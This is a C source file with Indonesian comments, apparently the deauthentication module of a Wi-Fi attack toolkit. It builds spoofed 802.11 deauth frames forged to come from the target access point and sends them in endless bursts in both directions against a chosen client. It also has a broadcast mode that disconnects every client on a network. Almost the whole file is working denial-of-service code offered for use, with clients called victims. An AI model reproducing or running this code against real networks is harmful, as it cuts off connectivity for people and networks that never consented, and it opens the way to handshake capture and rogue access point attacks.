// ============================================================================
// IMPLEMENTASI: attack/deauth.c — Mesin Injeksi Frame Pemutus Koneksi
// ============================================================================
#include "deauth.h"
#include "../utils/utils.h"
#include "../utils/logger.h"
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <net/if.h>

// Konteks Thread Deauth
typedef struct {
    char iface[16];
    uint8_t bssid[6];
    uint8_t client[6];
    int reason;
    int burst;
} deauth_target_t;

static volatile bool g_deauth_running = false;
static volatile int  g_deauth_active  = 0;
static pthread_t     g_deauth_tid;
static int           g_deauth_sock    = -1;
static pthread_mutex_t g_deauth_mutex = PTHREAD_MUTEX_INITIALIZER;

/*
 * === FUNGSI: close_deauth_socket() ===
 * Tujuan   : Menutup socket injeksi deauth dan membersihkan resource
 */
void close_deauth_socket(void) {
    pthread_mutex_lock(&g_deauth_mutex);
    if (g_deauth_sock >= 0) {
        close(g_deauth_sock);
        g_deauth_sock = -1;
    }
    pthread_mutex_unlock(&g_deauth_mutex);
}

/*
 * === FUNGSI: send_deauth_frame() ===
 * Tujuan   : Merakit dan menembakkan satu frame Deauthentication 26-byte
 * Parameter: int sock, sockaddr_ll, BSSID, Client MAC, reason code
 */
int send_deauth_frame(int sock, const struct sockaddr_ll *sll,
                      const uint8_t *bssid, const uint8_t *client, int reason) {
    uint8_t frame[26];
    wifi_header_t *hdr = (wifi_header_t*)frame;

    // Header MAC 802.11
    hdr->frame_control = htons(IEEE80211_FC_DEAUTH); // Opcode 0xC000
    hdr->duration = 0;
    memcpy(hdr->addr1, client, 6); // Destination: Korban yang diputus
    memcpy(hdr->addr2, bssid, 6);  // Source: AP asli yang dipalsukan
    memcpy(hdr->addr3, bssid, 6);  // BSSID
    hdr->seq_ctrl = 0;

    // Fixed Parameter Deauth: Reason Code (2 byte, Little-Endian di udara)
    frame[24] = reason & 0xFF;
    frame[25] = (reason >> 8) & 0xFF;

    return sendto(sock, frame, sizeof(frame), 0,
                  (struct sockaddr*)sll, sizeof(*sll));
}

/*
 * === FUNGSI: deauth_worker() ===
 * Tujuan   : Thread loop pengirim tembakan deauth burst
 */
static void *deauth_worker(void *arg) {
    deauth_target_t *tgt = (deauth_target_t*)arg;
    struct sockaddr_ll sll;
    
    // Buka socket deauth
    pthread_mutex_lock(&g_deauth_mutex);
    if (g_deauth_sock < 0) {
        g_deauth_sock = open_raw_socket(tgt->iface, &sll);
    }
    pthread_mutex_unlock(&g_deauth_mutex);

    if (g_deauth_sock < 0) {
        log_event(LOG_ERROR, "Deauth thread gagal membuka raw socket");
        g_deauth_running = false;
        free(tgt);
        return NULL;
    }

    log_event(LOG_INFO, "Deauth engine aktif: Menyerang target dengan burst=%d", tgt->burst);
    g_deauth_active = 1;

    while (g_deauth_running) {
        for (int i = 0; i < tgt->burst; i++) {
            // Tembak dari AP ke Client
            send_deauth_frame(g_deauth_sock, &sll, tgt->bssid, tgt->client, tgt->reason);
            // Tembak dari Client ke AP (Dual-Direction Deauth)
            send_deauth_frame(g_deauth_sock, &sll, tgt->client, tgt->bssid, tgt->reason);
            usleep(2000); // 2 ms antar frame dalam burst
        }
        usleep(100000);   // Istirahat 100 ms antar burst
    }

    g_deauth_active = 0;
    free(tgt);
    log_event(LOG_INFO, "Deauth thread selesai bertugas");
    return NULL;
}

/*
 * === FUNGSI: deauth_start() ===
 * Tujuan   : Memulai serangan deauthentication di thread terpisah
 */
int deauth_start(const char *iface, const uint8_t *bssid, const uint8_t *client, int reason, int burst) {
    // FIX v15.3 #2: Cegah start thread baru jika masih ada thread lama yang belum tuntas shutdown
    if (!g_deauth_running && g_deauth_active > 0) {
        log_event(LOG_WARN, "Deauth sedang shutdown, tunggu beberapa saat...");
        return -1;
    }

    deauth_stop_all_wait(1000); // Pastikan thread lama berhenti

    deauth_target_t *tgt = malloc(sizeof(deauth_target_t));
    if (!tgt) return -1;

    strncpy(tgt->iface, iface, sizeof(tgt->iface) - 1);
    memcpy(tgt->bssid, bssid, 6);
    memcpy(tgt->client, client, 6);
    tgt->reason = reason;
    tgt->burst = burst;

    g_deauth_running = true;
    if (pthread_create(&g_deauth_tid, NULL, deauth_worker, tgt) != 0) {
        log_event(LOG_ERROR, "Gagal membuat pthread deauth");
        g_deauth_running = false;
        free(tgt);
        return -1;
    }
    return 0;
}

/*
 * === FUNGSI: deauth_stop() ===
 * Tujuan   : Memberi instruksi thread deauth untuk berhenti
 */
void deauth_stop(void) {
    g_deauth_running = false;
}

/*
 * === FUNGSI: deauth_stop_all_wait() ===
 * Tujuan   : Menghentikan thread deauth dan menunggu secara sinkron dengan batas timeout
 */
int deauth_stop_all_wait(int timeout_ms) {
    g_deauth_running = false;
    int waited = 0;
    while (g_deauth_active > 0 && waited < timeout_ms) {
        usleep(10000); // Cek setiap 10 ms
        waited += 10;
    }
    if (g_deauth_active > 0) {
        log_event(LOG_WARN, "Deauth thread timeout saat shutdown!");
        return -1; // Timeout
    }
    close_deauth_socket();
    return 0; // Berhenti dengan sukses
}

/*
 * === FUNGSI: deauth_reset() ===
 * Tujuan   : Mereset state deauth secara aman
 */
void deauth_reset(void) {
    g_deauth_running = false;
    g_deauth_active = 0;
    close_deauth_socket();
}

/*
 * === FUNGSI: send_deauth_broadcast() ===
 * Tujuan   : Mengirimkan paket deauth broadcast ke semua client di BSSID target
 */
int send_deauth_broadcast(const char *iface, const uint8_t *bssid, int reason, int count) {
    struct sockaddr_ll sll;
    int sock = open_raw_socket(iface, &sll);
    if (sock < 0) return -1;

    uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    for (int i = 0; i < count; i++) {
        send_deauth_frame(sock, &sll, bssid, bcast, reason);
        usleep(5000);
    }
    close(sock);
    return 0;
}
